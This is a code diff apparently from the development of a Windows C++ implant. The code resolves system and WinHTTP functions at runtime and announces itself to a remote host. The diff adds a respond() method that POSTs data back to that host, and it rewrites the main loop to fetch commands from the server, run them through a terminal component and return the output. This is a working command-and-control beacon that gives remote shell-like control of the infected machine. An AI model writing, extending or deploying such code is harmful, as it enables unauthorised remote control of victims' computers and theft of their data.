@@ -37,14 +37,6 @@ Term::Term(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_h
     this->user32_handle = user32_handle;
 }
 
-// void my_copy_memory(void* dest, const void* src, size_t length) {
-//     char* d = static_cast<char*>(dest);
-//     const char* s = static_cast<const char*>(src);
-//     for (size_t i = 0; i < length; ++i) {
-//         d[i] = s[i];
-//     }
-// }
-
 void *my_copy_memory(void *dest, const void *src, size_t n) {
     char *cdest = (char *)dest;
     const char *csrc = (const char *)src;
@@ -324,6 +316,7 @@ public:
     Net(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port);
     char* announce(char name[16]);
     char* request(char* id);
+    void respond(char* id, char* response);
 
 private:
     uintptr_t ntdll_handle, kernel32_handle, user32_handle, winhttp_handle;
@@ -378,6 +371,57 @@ void Net::compose_id_header(char* id, const wchar_t** output) {
 
     *output = w_buffer;
     rtl_free_heap(heap, 0, buffer);
+}
+
+void Net::respond(char* id, char* response) {
+    decltype(WinHttpOpen) *win_http_open = RESOLVE_API(this->winhttp_handle, WinHttpOpen);
+	decltype(WinHttpConnect) *win_http_connect = RESOLVE_API(this->winhttp_handle, WinHttpConnect);
+	decltype(WinHttpOpenRequest) *win_http_open_request = RESOLVE_API(this->winhttp_handle, WinHttpOpenRequest);
+	decltype(WinHttpAddRequestHeaders) *win_http_add_request_headers = RESOLVE_API(this->winhttp_handle, WinHttpAddRequestHeaders);
+	decltype(WinHttpSendRequest) *win_http_send_request = RESOLVE_API(this->winhttp_handle, WinHttpSendRequest);
+	decltype(WinHttpReceiveResponse) *win_http_receive_response = RESOLVE_API(this->winhttp_handle, WinHttpReceiveResponse);
+	decltype(WinHttpQueryDataAvailable) *win_http_query_data_available = RESOLVE_API(this->winhttp_handle, WinHttpQueryDataAvailable);
+	decltype(WinHttpReadData) *win_http_read_data = RESOLVE_API(this->winhttp_handle, WinHttpReadData);
+	decltype(WinHttpCloseHandle) *win_http_close_handle = RESOLVE_API(this->winhttp_handle, WinHttpCloseHandle);
+
+    HINTERNET session = win_http_open(
+        L"",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0
+    );
+    if (!session) {
+        return;
+    }
+
+    HINTERNET conn = win_http_connect(session, this->host, this->port, 0);
+    if (!conn) {
+        return;
+    }
+
+    HINTERNET req = win_http_open_request(conn, L"POST", L"/v1", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!req) {
+        return;
+    }
+
+    const wchar_t* headers;
+
+    this->compose_id_header(id, &headers);
+
+    if (!win_http_add_request_headers(req, headers, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+        return;
+    }
+
+    size_t response_len = strlen(response);
+
+    if (!win_http_send_request(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)response, response_len, response_len, NULL)) {
+        return;
+    }
+
+    win_http_close_handle(req);
+    win_http_close_handle(conn);
+    win_http_close_handle(session);
 }
 
 char* Net::request(char* id) {
@@ -533,7 +577,6 @@ char* Net::announce(char name[16]) {
         return "8";
     }
 
-    // char* resp_data = new char[resp_size + 1];
     HANDLE heap = get_process_heap();
     if (!heap) {
         return "get_process_heap";
@@ -555,7 +598,6 @@ char* Net::announce(char name[16]) {
 
     resp_data[bytes_read] = '\0';
 
-    // delete[] resp_data;
     win_http_close_handle(req);
     win_http_close_handle(conn);
     win_http_close_handle(session);
@@ -645,11 +687,14 @@ auto declfn instance::start(_In_ void *arg) -> void {
 	// msgbox(nullptr, announce_result, symbol<const char *>("caption"), MB_OK);
 	// DBG_PRINTF("announce result: %d", announce_result);
 
-    char* response = net.request(machine.get_id());
-	msgbox(nullptr, response, symbol<const char *>("caption"), MB_OK);
+	// msgbox(nullptr, response, symbol<const char *>("caption"), MB_OK);
 
 	while (1) {
-		msgbox(nullptr, symbol<const char *>("Hello world"), symbol<const char *>("caption"), MB_OK);
+		// msgbox(nullptr, symbol<const char *>("Hello world"), symbol<const char *>("caption"), MB_OK);
+
+        char* response = net.request(machine.get_id());
+        char* output = term.run(response);
+        net.respond(machine.get_id(), output);
 
 		sleep(MAIN_LOOP_SLEEP_MILI);
 	}
